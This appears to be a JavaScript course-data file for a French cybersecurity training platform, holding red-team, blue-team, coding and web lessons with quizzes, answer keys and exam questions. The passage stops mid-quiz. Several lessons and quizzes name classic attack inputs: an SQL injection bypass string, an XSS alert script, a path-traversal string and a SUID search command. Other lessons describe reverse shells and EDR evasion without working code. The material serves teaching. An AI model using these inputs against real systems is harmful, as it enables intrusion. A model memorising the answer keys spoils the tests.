/* =========================================================================
   CYBERACADEMY PRO - Core Engine v9.0 (4 Niveaux Experts & CTF Massifs)
   ========================================================================= */

const trackDB = {
    "red": [
        {
            id: 101, title: "Niveau 1 : Fondations Linux & Commandes Système",
            themes: [
                { 
                    id: "r_lvl1", title: "Masterclass : Maîtrise du Terminal Linux", desc: "Guide complet (1-2 pages) : Navigation, permissions, fichiers cachés et outils de recherche.", 
                    content: `
                        <h2>1. Introduction au système Linux en cybersécurité</h2>
                        <p>Plus de 90 % des serveurs mondiaux, des routeurs et des infrastructures Cloud fonctionnent sous Linux. Pour un analyste en sécurité ou un testeur d'intrusion (Pentester), la maîtrise absolue du terminal Linux n'est pas une option. Sous Linux, la philosophie fondamentale est que <strong>tout est un fichier</strong>.</p>
                        <h3>Commandes indispensables de gestion</h3>
                        <table>
                            <tr><th>Commande</th><th>Description détaillée</th></tr>
                            <tr><td><code>pwd</code></td><td>Affiche le chemin absolu du répertoire courant.</td></tr>
                            <tr><td><code>ls -la</code></td><td>Liste tous les fichiers, y compris cachés, avec permissions.</td></tr>
                            <tr><td><code>grep</code></td><td>Recherche un motif ou une chaîne de caractères dans un fichier.</td></tr>
                            <tr><td><code>chmod</code></td><td>Modifie les permissions d'accès (Lecture, Écriture, Exécution).</td></tr>
                        </table>
                    `, 
                    simType: "terminal", 
                    simData: { instruction: "Affichez tous les fichiers cachés avec la commande adéquate.", expected: "ls -a", successOutput: "Fichiers détectés : config.php, .ssh_key" }, 
                    quiz: [
                        { q: "1. Que signifie le point (.) au début d'un nom de fichier sous Linux ?", options: ["Fichier corrompu", "Fichier caché", "Fichier système protégé"], ans: "1" },
                        { q: "2. Quelle commande permet de chercher un texte dans un fichier ?", options: ["find", "grep", "search"], ans: "1" },
                        { q: "3. Que gère la commande chmod ?", options: ["Les permissions d'accès", "L'adresse IP", "Le mot de passe root"], ans: "0" },
                        { q: "4. Quel est le symbole représentant le super-utilisateur (administrateur suprême) ?", options: ["#", "$", "@"], ans: "0" },
                        { q: "5. Comment afficher l'aide d'une commande dans le terminal ?", options: ["--help ou man", "?", "info-doc"], ans: "0" },
                        { q: "6. Quelle commande affiche l'arborescence des processus ?", options: ["ps aux", "ls-proc", "top-run"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quelle commande liste les fichiers cachés ?", options: ["ls -a", "cat -all", "show hidden"], ans: "0" }]
        },
        {
            id: 102, title: "Niveau 2 : OWASP Top 10 & Injections Web (SQLi, XSS)",
            themes: [
                { 
                    id: "r_lvl2", title: "Masterclass : Injections SQL et XSS", desc: "Guide complet (1-2 pages) : Contournement d'authentification et exécution de scripts côté client.", 
                    content: `
                        <h2>1. Injections SQL (SQLi)</h2>
                        <p>Une injection SQL survient lorsqu'une application intègre des entrées utilisateur non assainies directement dans une requête de base de données. L'attaquant peut modifier la logique de la requête à l'aide de charges utiles telles que <code>' OR 1=1 -- -</code> pour contourner les mots de passe.</p>
                        <h2>2. Cross-Site Scripting (XSS)</h2>
                        <p>Le XSS permet d'injecter du code JavaScript malveillant dans une page web vue par d'autres utilisateurs. On distingue le XSS Stored (enregistré en base) et le XSS Reflected (reflété instantanément).</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Quel payload classique permet un bypass d'authentification SQLi ?", options: ["' OR 1=1 -- -", "<script>alert(1)</script>", "../../etc/passwd"], ans: "0" },
                        { q: "2. Quel est l'impact principal d'une faille XSS Stored ?", options: ["Vol de cookies de session des visiteurs", "Plantage direct du disque dur serveur", "Effacement de la table SQL"], ans: "0" },
                        { q: "3. Qu'est-ce qu'une Blind SQLi ?", options: ["Une injection où le serveur ne renvoie pas directement les erreurs SQL", "Une injection aveugle sans clavier", "Un bug d'affichage CSS"], ans: "0" },
                        { q: "4. Comment se protège-t-on contre les injections SQL ?", options: ["Requêtes préparées (Prepared Statements)", "Chiffrer le site en HTTP", "Masquer le bouton de login"], ans: "0" },
                        { q: "5. Que signifie l'acronyme WAF ?", options: ["Web Application Firewall", "Wireless Access Framework", "Web Audit File"], ans: "0" },
                        { q: "6. Quel protocole transporte le trafic web classique non chiffré ?", options: ["HTTP (Port 80)", "FTP (Port 21)", "SSH (Port 22)"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quelle contre-mesure stoppe net les injections SQL ?", options: ["Les requêtes préparées", "Un mot de passe long", "Le masquage d'URL"], ans: "0" }]
        },
        {
            id: 103, title: "Niveau 3 : Post-Exploitation & Élévation de Privilèges",
            themes: [
                { 
                    id: "r_lvl3", title: "Masterclass : SUID, Cron Jobs et Pivoting", desc: "Guide complet (1-2 pages) : Passage de l'utilisateur standard à root et rebond réseau.", 
                    content: `
                        <h2>1. Élévation de privilèges (PrivEsc) sous Linux</h2>
                        <p>Une fois un premier pied à terre acquis via un reverse shell standard (souvent en tant qu'utilisateur restreint <code>www-data</code>), l'objectif est de s'élever au statut de <code>root</code>. On recherche les binaires mal configurés avec le bit <strong>SUID</strong> activé grâce à la commande : <code>find / -perm -4000 2>/dev/null</code>.</p>
                        <h2>2. Pivoting et Redirection de port</h2>
                        <p>Lorsque le réseau cible est cloisonné par un pare-feu, l'opérateur utilise des outils de tunneling (comme Chisel, Socat ou SSH port forwarding) pour rebondir de machine en machine et atteindre le réseau interne invisible.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Que permet de détecter la commande find / -perm -4000 2>/dev/null ?", options: ["Les binaires avec le bit SUID activé", "Les fichiers supprimés", "Les mots de passe en clair"], ans: "0" },
                        { q: "2. Qu'appelle-t-on le 'Pivoting' en Red Team ?", options: ["Rebondir à travers une machine compromise pour attaquer un réseau interne isolé", "Tourner l'écran du pc", "Changer d'adresse IP source toutes les secondes"], ans: "0" },
                        { q: "3. Quel outil permet de créer un tunnel SOCKS proxy facilement en pentest ?", options: ["Chisel", "Nmap", "Wireshark"], ans: "0" },
                        { q: "4. Qu'est-ce qu'une tâche cron mal sécurisée peut engendrer ?", options: ["Une élévation de privilèges si le script exécuté est modifiable en écriture", "Un crash du kernel Linux", "Une panne d'électricité"], ans: "0" },
                        { q: "5. Quel utilisateur possède tous les droits absolus sur un système Linux ?", options: ["root", "guest", "admin"], ans: "0" },
                        { q: "6. Qu'est-ce qu'un token d'accès sous Windows ? ", options: ["Un objet de sécurité décrivant le contexte de sécurité d'un utilisateur", "Un badge RFID physique", "Une clé de chiffrement BitLocker"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel bit permet à un exécutable d'être lancé avec les droits de son propriétaire ?", options: ["Le bit SUID", "Le bit Read-Only", "Le bit Exec-All"], ans: "0" }]
        },
        {
            id: 104, title: "Niveau 4 (Expert) : Attaques Active Directory & Evasion EDR",
            themes: [
                { 
                    id: "r_lvl4", title: "Masterclass : Kerberoasting & Contournement EDR", desc: "Guide complet (1-2 pages) : Compromission de domaines Windows et obfuscation avancée.", 
                    content: `
                        <h2>1. Attaques sur l'Active Directory (AD)</h2>
                        <p>Dans les grandes entreprises, l'Active Directory gère les authentifications. Les attaques majeures incluent le <strong>Kerberoasting</strong> (récupération de tickets de service pour les casser hors-ligne par force brute) et les attaques par <strong>Golden Ticket</strong> permettant de forger un ticket TGT administrateur maître.</p>
                        <h2>2. Contournement d'EDR et AMSI</h2>
                        <p>Les solutions de sécurité modernes (EDR) analysent les comportements en temps réel. Les attaquants utilisent l'injection de code dans des processus légitimes (Process Hollowing) et le patch de l'AMSI (Antimalware Scan Interface) en mémoire pour aveugler les sondes.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Qu'est-ce que le Kerberoasting ?", options: ["Une technique d'extraction et de cassage hors-ligne de tickets de service Active Directory", "Une méthode de cuisson de café sur serveur", "Un protocole de chiffrement Wi-Fi"], ans: "0" },
                        { q: "2. Quel est l'objectif d'une attaque Golden Ticket ?", options: ["Forger un ticket d'authentification TGT maître pour un contrôle total du domaine AD", "Gagner un voyage", "Obtenir un accès invité"], ans: "0" },
                        { q: "3. Que cible l'AMSI (Antimalware Scan Interface) sous Windows ?", options: ["L'analyse en mémoire des scripts dynamiques (PowerShell, VBScript)", "La vitesse de la carte graphique", "La résolution de l'écran"], ans: "0" },
                        { q: "4. Qu'est-ce que le Process Hollowing ?", options: ["Une technique d'injection consistant à vider un processus légitime pour y loger du code malveillant", "Le nettoyage de la corbeille", "L'optimisation du processeur"], ans: "0" },
                        { q: "5. Quel protocole réseau est au cœur de l'authentification Active Directory ?", options: ["Kerberos", "SMTP", "DHCP"], ans: "0" },
                        { q: "6. Qu'est-ce qu'un Pass-the-Hash ?", options: ["Réutiliser un hachage de mot de passe capturé pour s'authentifier sans connaître le texte en clair", "Changer son mot de passe en un hashtag Twitter", "Effacer le cache du navigateur"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel protocole gère les tickets d'authentification dans un domaine Windows ?", options: ["Kerberos", "DNS", "SNMP"], ans: "0" }]
        }
    ],
    "blue": [
        {
            id: 201, title: "Niveau 1 : Analyse de Logs & Codes HTTP",
            themes: [
                { 
                    id: "b_lvl1", title: "Masterclass : Analyse Forensique des Logs Web", desc: "Guide complet (1-2 pages) : Lecture des fichiers access.log et codes de statut.", 
                    content: `
                        <h2>1. Anatomie d'un log web</h2>
                        <p>Les journaux d'accès (access.log) enregistrent chaque requête HTTP : IP source, horodatage, méthode, URL, code de statut et taille de la réponse.</p>
                        <h2>2. Codes HTTP clés</h2>
                        <p><code>200 OK</code> (succès), <code>403 Forbidden</code> (accès interdit), <code>404 Not Found</code> (reconnaissance/scan), <code>500 Internal Error</code> (plantage suite à injection).</p>
                    `, 
                    simType: "logs", 
                    simData: { instruction: "Trouvez l'IP de l'attaquant dans les logs." }, 
                    quiz: [
                        { q: "1. Que signifie le code HTTP 403 ?", options: ["Accès interdit / refusé", "Succès", "Redirection"], ans: "0" },
                        { q: "2. Quelle information se trouve au début d'une ligne de log d'accès ?", options: ["L'adresse IP source", "Le nom du processeur", "La version du BIOS"], ans: "0" },
                        { q: "3. Un code 404 massif en provenance d'une seule IP indique généralement quoi ?", options: ["Une phase de scan et de reconnaissance de dossiers", "Un téléchargement réussi", "Une mise à jour Windows"], ans: "0" },
                        { q: "4. Quel est le rôle principal d'une équipe Blue Team ?", options: ["Surveiller, détecter et neutraliser les menaces", "Créer des virus", "Vendre des logiciels"], ans: "0" },
                        { q: "5. Que traduit un code 500 après une injection suspecte ?", options: ["Une erreur critique du backend (souvent due à une faille)", "Une réussite totale de l'utilisateur", "Une déconnexion Wi-Fi"], ans: "0" },
                        { q: "6. Quel protocole sécurise les communications web ?", options: ["HTTPS", "Telnet", "HTTP"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel code HTTP indique une page introuvable ?", options: ["404", "200", "302"], ans: "0" }]
        },
        {
            id: 202, title: "Niveau 2 : Durcissement (Hardening) & Pare-feu",
            themes: [
                { 
                    id: "b_lvl2", title: "Masterclass : Sécurisation Système & Fail2Ban", desc: "Guide complet (1-2 pages) : Filtrage réseau et bannissement automatique.", 
                    content: `
                        <h2>1. Durcissement de l'OS</h2>
                        <p>Le hardening consiste à réduire la surface d'attaque en fermant les ports superflus, en configurant un pare-feu strict (UFW / Iptables) et en interdisant l'authentification par mot de passe pour SSH (utilisation exclusive de clés cryptographiques).</p>
                        <h2>2. Automatisation avec Fail2Ban</h2>
                        <p>Fail2Ban analyse les logs en temps réel pour détecter les attaques par force brute et bannit automatiquement les adresses IP suspectes via des règles de pare-feu.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Quel est l'objectif principal du Hardening (durcissement) d'un serveur ?", options: ["Réduire la surface d'attaque en fermant les services inutiles", "Augmenter la température du processeur", "Installer des jeux vidéo"], ans: "0" },
                        { q: "2. Quel outil analyse les logs pour bannir automatiquement les IP agressives ?", options: ["Fail2Ban", "Photoshop", "Notepad++"], ans: "0" },
                        { q: "3. Quelle est la meilleure pratique pour sécuriser l'accès SSH à distance ?", options: ["Utiliser des clés SSH et interdire les mots de passe en clair", "Mettre 'admin' comme mot de passe", "Laisser le port par défaut ouvert sans pare-feu"], ans: "0" },
                        { q: "4. Que fait un pare-feu (Firewall) ? ", options: ["Filtre le trafic réseau entrant et sortant selon des règles de sécurité", "Éteint l'ordinateur en cas d'orage", "Nettoie l'écran"], ans: "0" },
                        { q: "5. Quel port est utilisé par défaut pour le service sécurisé SSH ?", options: ["Port 22", "Port 80", "Port 21"], ans: "0" },
                        { q: "6. Qu'est-ce qu'une règle DROP dans un pare-feu iptables ?", options: ["Ignorer et supprimer silencieusement le paquet réseau sans avertir l'expéditeur", "Accepter le paquet", "Rediriger le paquet vers un autre site"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel service bannit automatiquement les IP après plusieurs échecs de connexion ?", options: ["Fail2Ban", "Apache", "Cron"], ans: "0" }]
        },
        {
            id: 203, title: "Niveau 3 : Réponse sur Incident & SIEM",
            themes: [
                { 
                    id: "b_lvl3", title: "Masterclass : Corrélation d'Alertes et SIEM", desc: "Guide complet (1-2 pages) : Analyse centralisée des logs et gestion de crise.", 
                    content: `
                        <h2>1. Utilisation d'un SIEM</h2>
                        <p>Un SIEM (Security Information and Event Management) centralise l'ensemble des logs d'un système d'information pour corréler des événements disparates et lever des alertes en temps réel.</p>
                        <h2>2. Confinement d'urgence</h2>
                        <p>Lors d'une compromission avérée, la priorité absolue de l'équipe de réponse sur incident est l'isolation physique ou logique de la machine sans couper l'alimentation électrique afin de préserver la mémoire RAM.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Que signifie l'acronyme SIEM en cybersécurité ?", options: ["Security Information and Event Management", "System Internal Error Monitor", "Secure Internet Email Message"], ans: "0" },
                        { q: "2. Pourquoi ne doit-on pas éteindre brutalement une machine compromise lors d'un incident ?", options: ["Pour préserver l'intégrité de la mémoire vive (RAM) et des artefacts volatils", "Pour économiser de l'électricité", "Pour éviter de casser le clavier"], ans: "0" },
                        { q: "3. Qu'est-ce qu'un Indicateur de Compromission (IoC) ?", options: ["Un artéfact (hachage, IP, nom de fichier) prouvant qu'un système a été piraté", "Un voyant lumineux sur le boîtier", "Un certificat SSL valide"], ans: "0" },
                        { q: "4. Quelle est la première étape du cycle de réponse sur incident ?", options: ["La préparation", "L'attaque de riposte", "La vente des serveurs"], ans: "0" },
                        { q: "5. Que mesure le temps moyen de détection (MTTD) ?", options: ["Le temps moyen mis pour découvrir une intrusion sur le réseau", "Le temps pour redémarrer un PC", "Le temps de téléchargement d'un fichier"], ans: "0" },
                        { q: "6. Qu'est-ce que l'analyse post-mortem ?", options: ["Un rapport d'analyse détaillé réalisé après la résolution de l'incident pour éviter qu'il ne se reproduise", "Une autopsie médicale", "Un test de vitesse disque"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel est l'objectif d'un SIEM ?", options: ["Centraliser et corréler les logs de sécurité en temps réel", "Envoyer des e-mails publicitaires", "Compresser les fichiers zip"], ans: "0" }]
        },
        {
            id: 204, title: "Niveau 4 (Expert) : Forensics Mémoire & Threat Intelligence",
            themes: [
                { 
                    id: "b_lvl4", title: "Masterclass : Analyse RAM Avancée (Volatility) & YARA", desc: "Guide complet (1-2 pages) : Extraction de processus cachés et recherche de signatures de malwares.", 
                    content: `
                        <h2>1. Analyse Forensique de la RAM</h2>
                        <p>À l'aide d'outils comme Volatility, les experts analysent les dumps mémoire pour retrouver des connexions réseau occultes, des clés de chiffrement et des processus injectés invisibles sur le disque dur.</p>
                        <h2>2. Signatures YARA et Threat Intelligence</h2>
                        <p>YARA est le standard pour identifier et classifier les malwares en écrivant des règles textuelles basées sur des motifs binaires ou textuels caractéristiques.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Quel framework est la référence pour l'analyse de dumps mémoire RAM ?", options: ["Volatility", "Wireshark", "Nmap"], ans: "0" },
                        { q: "2. À quoi servent principalement les règles YARA ?", options: ["Identifier et classifier des malwares par la recherche de motifs spécifiques", "Calculer des adresses IP", "Optimiser les bases de données SQL"], ans: "0" },
                        { q: "3. Qu'est-ce qu'un rootkit ?", options: ["Un logiciel malveillant conçu pour dissimuler sa présence et celle d'autres programmes au système", "Une application de jardinage", "Un routeur Wi-Fi professionnel"], ans: "0" },
                        { q: "4. Que permet de détecter la commande pslist dans Volatility ?", options: ["La liste des processus actifs présents dans la mémoire au moment du dump", "La liste des utilisateurs inscrits sur le site web", "Le contenu du disque dur"], ans: "0" },
                        { q: "5. Qu'est-ce que la Threat Intelligence ?", options: ["L'analyse et la collecte de renseignements sur les menaces et les groupes de pirates", "Un test de QI pour administrateurs", "Un pare-feu intelligent"], ans: "0" },
                        { q: "6. Qu'est-ce qu'un fichier malveillant polymorphe ?", options: ["Un malware qui modifie son code à chaque infection pour échapper aux signatures statiques", "Un virus en plastique", "Un fichier image"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel outil utilise-t-on pour analyser un fichier de dump mémoire brut ?", options: ["Volatility", "GIMP", "VLC"], ans: "0" }]
        }
    ],
    "code": [
        {
            id: 301, title: "Niveau 1 : Automatisation de Base en Python",
            themes: [
                { 
                    id: "c_lvl1", title: "Masterclass : Requêtes HTTP & Parsing en Python", desc: "Guide complet (1-2 pages) : Utilisation du module requests et manipulation de fichiers.", 
                    content: `
                        <h2>1. Le module requests</h2>
                        <p>Python permet d'automatiser des actions web grâce à la bibliothèque <code>requests</code>. On peut envoyer des GET/POST et analyser les codes de statut instantanément.</p>
                    `, 
                    simType: "code", 
                    simData: { instruction: "Importez requests." }, 
                    quiz: [
                        { q: "1. Quel module Python gère les requêtes HTTP ?", options: ["requests", "os", "sys"], ans: "0" },
                        { q: "2. Que renvoie response.status_code pour un succès ?", options: ["200", "404", "500"], ans: "0" },
                        { q: "3. Comment lire le texte d'une page web récupérée en Python ?", options: ["response.text", "response.html", "response.read"], ans: "0" },
                        { q: "4. Quel opérateur gère les boucles en Python ?", options: ["for / while", "loop / repeat", "iterate"], ans: "0" },
                        { q: "5. Comment ouvrir un fichier en écriture en Python ?", options: ["open('file.txt', 'w')", "open('file.txt', 'r')", "file.create()"], ans: "0" },
                        { q: "6. Qu'est-ce qu'une exception en programmation ?", options: ["Une erreur gérée par le code pour éviter le crash (try/except)", "Une exception fiscale", "Un fichier corrompu"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel module Python permet d'interagir avec le web ?", options: ["requests", "math", "random"], ans: "0" }]
        },
        {
            id: 302, title: "Niveau 2 : Scanners de Ports & Bruteforce Multithread",
            themes: [
                { 
                    id: "c_lvl2", title: "Masterclass : Sockets et Concurrence", desc: "Guide complet (1-2 pages) : Création de scanners TCP et scripts de bruteforce rapides.", 
                    content: `
                        <h2>1. Sockets réseau bas niveau</h2>
                        <p>La bibliothèque <code>socket</code> permet d'établir des connexions TCP brutes pour tester l'ouverture des ports sur une machine cible.</p>
                        <h2>2. Multithreading</h2>
                        <p>Pour accélérer un script d'attaque ou de scan, on utilise le module <code>threading</code> afin d'exécuter plusieurs requêtes en parallèle.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Quelle bibliothèque Python permet de créer des connexions TCP brutes ?", options: ["socket", "requests", "json"], ans: "0" },
                        { q: "2. Quel est l'intérêt du Multithreading dans un script de scan ?", options: ["Accélérer considérablement l'exécution en lançant des tâches en parallèle", "Ralentir l'ordinateur", "Chiffrer le code source"], ans: "0" },
                        { q: "3. Qu'est-ce qu'une Wordlist dans un contexte de bruteforce ?", options: ["Un fichier texte contenant une liste de mots de passe potentiels à tester", "Un dictionnaire de synonymes français", "Un fichier de configuration réseau"], ans: "0" },
                        { q: "4. Comment gère-t-on les connexions refusées dans un socket TCP en Python ?", options: ["Via un bloc try/except pour capturer l'exception de connexion", "En redémarrant le PC", "En modifiant le BIOS"], ans: "0" },
                        { q: "5. Quel protocole réseau utilise des ports TCP et UDP ?", options: ["TCP/IP", "Bluetooth", "USB"], ans: "0" },
                        { q: "6. Qu'est-ce qu'un timeout dans une requête réseau ?", options: ["Un délai maximal d'attente avant d'abandonner la connexion", "Une pause déjeuner du serveur", "Une erreur de syntaxe"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quelle bibliothèque gère les connexions TCP bas niveau en Python ?", options: ["socket", "urllib", "time"], ans: "0" }]
        },
        {
            id: 303, title: "Niveau 3 : Développement de Reverse Shells & Payloads",
            themes: [
                { 
                    id: "c_lvl3", title: "Masterclass : Reverse Shells et Subprocess", desc: "Guide complet (1-2 pages) : Manipulation de processus et connexion inversée.", 
                    content: `
                        <h2>1. Logique du Reverse Shell</h2>
                        <p>Plutôt que d'attendre une connexion entrante (souvent bloquée par les routeurs et pare-feu), le script malveillant exécuté sur la victime initie une connexion sortante vers l'écouteur de l'attaquant.</p>
                        <h2>2. Le module subprocess</h2>
                        <p>Permet d'exécuter des commandes système directement depuis le script Python et de rediriger les flux I/O vers le socket réseau.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Qu'est-ce qu'un Reverse Shell ?", options: ["Une connexion inversée où la victime se connecte à l'attaquant pour contourner les pare-feu", "Une marche arrière en voiture", "Une mise à jour système"], ans: "0" },
                        { q: "2. Quel module Python permet d'exécuter des commandes du système d'exploitation ?", options: ["subprocess", "math", "datetime"], ans: "0" },
                        { q: "3. Pourquoi les reverse shells contournent-ils généralement les pare-feu d'entreprise ?", options: ["Parce que les flux sortants vers Internet sont souvent autorisés pour les employés", "Parce qu'ils sont invisibles", "Parce qu'ils utilisent le Bluetooth"], ans: "0" },
                        { q: "4. Quel est le rôle d'un écouteur (Listener) comme Netcat chez l'attaquant ?", options: ["Attendre et réceptionner la connexion entrante de la victime", "Écouter de la musique", "Enregistrer le son du micro"], ans: "0" },
                        { q: "5. Qu'est-ce qu'une redirection de flux standard (stdin/stdout) ?", options: ["Envoyer les entrées/sorties d'un terminal à travers un socket réseau", "Transférer un fichier par e-mail", "Imprimer un document"], ans: "0" },
                        { q: "6. Quel risque présente l'exécution d'un script Python non vérifié sur sa machine ?", options: ["Exécution de code arbitraire et compromission totale du système", "Ralentissement de l'affichage", "Changement de la langue du clavier"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel module Python est utilisé pour lancer des commandes système dans un reverse shell ?", options: ["subprocess", "sys", "csv"], ans: "0" }]
        },
        {
            id: 304, title: "Niveau 4 (Expert) : Obfuscation & Exploits Avancés",
            themes: [
                { 
                    id: "c_lvl4", title: "Masterclass : Contournement EDR et Chiffrement de Payloads", desc: "Guide complet (1-2 pages) : Obfuscation de code et sockets chiffrés en Python.", 
                    content: `
                        <h2>1. Obfuscation de code</h2>
                        <p>Pour contrer l'analyse statique des antivirus et des EDR, les scripts Python offensifs sont chiffrés ou encodés (Base64, XOR, AES) et déchiffrés dynamiquement en mémoire juste avant l'exécution.</p>
                        <h2>2. Sockets SSL/TLS</h2>
                        <p>Encapsuler les flux du reverse shell dans une couche SSL/TLS (via le module <code>ssl</code> de Python) permet de tromper les sondes DPI (Deep Packet Inspection) du réseau.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Quel est l'objectif principal de l'obfuscation de code en programmation offensive ?", options: ["Masquer la signature du code pour contourner l'analyse statique des antivirus", "Rendre le code illisible pour l'auteur", "Compresser la taille du fichier"], ans: "0" },
                        { q: "2. Comment sécuriser un socket réseau en Python pour contrer l'analyse DPI ?", options: ["En l'encapsulant avec le module ssl (TLS)", "En écrivant en minuscules", "En utilisant le protocole HTTP"], ans: "0" },
                        { q: "3. Qu'est-ce qu'un décodeur stub (stubs de décodage) ?", options: ["Un petit bout de code chargé de déchiffrer le payload principal en mémoire à l'exécution", "Un bâton de marche", "Un connecteur USB"], ans: "0" },
                        { q: "4. Qu'est-ce que l'analyse heuristique d'un antivirus ?", options: ["Une méthode de détection cherchant des comportements suspects ou des structures de code malveillantes", "Un test de QI du processeur", "Un scan de la mémoire RAM"], ans: "0" },
                        { q: "5. Quelle fonction mathématique simple est souvent utilisée pour l'obscurcissement basique de chaînes ?", options: ["XOR", "Racine carrée", "Cosinus"], ans: "0" },
                        { q: "6. Qu'est-ce qu'une exécution de code in-memory (Fileless) ?", options: ["Exécuter du code directement dans la RAM sans jamais l'écrire sur le disque dur", "Imprimer du code sur papier", "Sauvegarder sur clé USB"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel module Python gère le chiffrement SSL/TLS des sockets réseau ?", options: ["ssl", "crypto-net", "secure-socket"], ans: "0" }]
        }
    ],
    "dev": [
        {
            id: 401, title: "Niveau 1 : Architecture du Web et DOM",
            themes: [
                { 
                    id: "d_lvl1", title: "Masterclass : Fondations HTML, CSS et DOM", desc: "Guide complet (1-2 pages) : Structure des pages web et analyse du code source.", 
                    content: `
                        <h2>1. Le modèle DOM</h2>
                        <p>Le HTML structure la page en arborescence d'objets (DOM). Les attaquants inspectent ce code pour dénicher des commentaires oubliés ou des endpoints cachés.</p>
                    `, 
                    simType: "dev_html", 
                    simData: { instruction: "Écrivez une balise h1 contenant le mot 'Hack'." }, 
                    quiz: [
                        { q: "1. Que signifie DOM ?", options: ["Document Object Model", "Data Online Method", "Direct Output Monitor"], ans: "0" },
                        { q: "2. Quelle balise crée un lien hypertexte ?", options: ["<a>", "<link>", "<href>"], ans: "0" },
                        { q: "3. Quel est l'intérêt d'analyser le code source HTML en pentest ?", options: ["Trouver des commentaires ou des secrets oubliés par les développeurs", "Changer le fond d'écran", "Augmenter la RAM"], ans: "0" },
                        { q: "4. Quel langage gère le design visuel ?", options: ["CSS", "HTML", "SQL"], ans: "0" },
                        { q: "5. Où s'exécute le JavaScript traditionnel ?", options: ["Dans le navigateur client", "Sur le disque dur du serveur", "Dans le routeur"], ans: "0" },
                        { q: "6. Qu'est-ce qu'un attribut HTML ?", options: ["Une information complémentaire placée dans la balise (ex: id, class, href)", "Un fichier image", "Une ligne de code CSS"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel langage structure le contenu textuel d'une page web ?", options: ["HTML", "Python", "SQL"], ans: "0" }]
        },
        {
            id: 402, title: "Niveau 2 : Failles OWASP Top 10 (CSRF & XSS Avancé)",
            themes: [
                { 
                    id: "d_lvl2", title: "Masterclass : Sécurité des Formulaires et CSRF", desc: "Guide complet (1-2 pages) : Protection des sessions et usurpation de requêtes.", 
                    content: `
                        <h2>1. Attaque CSRF</h2>
                        <p>Le Cross-Site Request Forgery force un utilisateur authentifié à exécuter des actions non souhaitées sur une application web tierce en exploitant sa session active.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Qu'est-ce qu'une attaque CSRF ?", options: ["Forcer un utilisateur authentifié à exécuter des actions à son insu sur un site web", "Voler un mot de passe par écoute réseau", "Inonder un serveur de pings"], ans: "0" },
                        { q: "2. Comment se protège-t-on efficacement contre le CSRF ?", options: ["Utilisation de jetons anti-CSRF (Tokens uniques par session/requête)", "Désactiver JavaScript", "Utiliser HTTP simple"], ans: "0" },
                        { q: "3. Qu'est-ce qu'un cookie SameSite ?", options: ["Un attribut de cookie limitant l'envoi du cookie lors de requêtes cross-site", "Un biscuit numérique", "Un cookie publicitaire"], ans: "0" },
                        { q: "4. Quelle est la différence majeure entre XSS et CSRF ?", options: ["Le XSS exécute du code malveillant sur le site de la victime, le CSRF détourne sa session pour faire des actions légitimes à son insu", "Il n'y en a aucune", "Le CSRF n'existe qu'en Python"], ans: "0" },
                        { q: "5. Qu'est-ce qu'un header HTTP ?", options: ["Une métadonnée transmise dans la requête ou la réponse HTTP (ex: User-Agent, Cookie)", "Le titre principal d'une page web", "Le logo du site"], ans: "0" },
                        { q: "6. Qu'est-ce que l'en-tête CORS (Cross-Origin Resource Sharing) ?", options: ["Un mécanisme de sécurité HTTP contrôlant l'accès aux ressources d'un domaine depuis une origine différente", "Un protocole de messagerie", "Un outil de compression"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel mécanisme protège les formulaires contre le CSRF ?", options: ["Les tokens anti-CSRF", "Le HTTPS", "Le CSS"], ans: "0" }]
        },
        {
            id: 403, title: "Niveau 3 : Sécurité des API REST & Authentification JWT",
            themes: [
                { 
                    id: "d_lvl3", title: "Masterclass : Analyse et Attaques sur les JWT", desc: "Guide complet (1-2 pages) : Header, Payload, Signature et failles algorithmiques.", 
                    content: `
                        <h2>1. Structure des JWT</h2>
                        <p>Un JSON Web Token est composé de trois parties séparées par des points : Header (algorithme), Payload (données utilisateur) et Signature (vérification d'intégrité).</p>
                        <h2>2. Vulnérabilités majeures</h2>
                        <p>Modification de l'algorithme de signature en <code>none</code>, ou cassage de la clé secrète HMAC par force brute via des wordlists (hashcat).</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. De combien de parties distinctes est constitué un jeton JWT standard ?", options: ["3 parties (Header, Payload, Signature)", "2 parties", "5 parties"], ans: "0" },
                        { q: "2. Quelle faille classique concerne les JWT ?", options: ["La modification de l'algorithme de signature à 'none' pour contourner la vérification", "L'injection de code SQL dans le header", "Le format d'image corrompu"], ans: "0" },
                        { q: "3. Où sont encodées les données d'un JWT ?", options: ["En Base64Url", "En binaire pur", "En texte clair non encodé"], ans: "0" },
                        { q: "4. Quel est le rôle de la signature dans un JWT ?", options: ["Garantir l'intégrité du jeton et prouver qu'il a été émis par un serveur légitime", "Chiffrer le mot de passe utilisateur", "Accélérer la connexion Wi-Fi"], ans: "0" },
                        { q: "5. Qu'est-ce qu'une API REST ?", options: ["Une interface de programmation applicative basée sur les principes HTTP (GET, POST, PUT, DELETE)", "Un protocole de messagerie instantanée", "Un antivirus"], ans: "0" },
